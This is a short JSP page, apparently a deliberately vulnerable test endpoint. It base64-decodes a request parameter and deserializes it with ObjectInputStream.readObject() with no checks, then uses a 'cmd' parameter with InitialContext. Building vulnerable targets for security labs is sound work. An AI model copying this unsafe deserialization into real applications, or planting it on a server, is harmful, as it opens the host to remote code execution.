<%@ page import="java.io.*" %>
<%@ page import="javax.naming.InitialContext" %>

<%

    String ser = request.getParameter("ser");
    String cmd = request.getParameter("cmd");

    byte[] objectByte = new sun.misc.BASE64Decoder().decodeBuffer(ser);
    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(objectByte);
    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);

    InitialContext initialContext = (InitialContext) objectInputStream.readObject();
    out.print(initialContext.composeName(cmd,""));
%>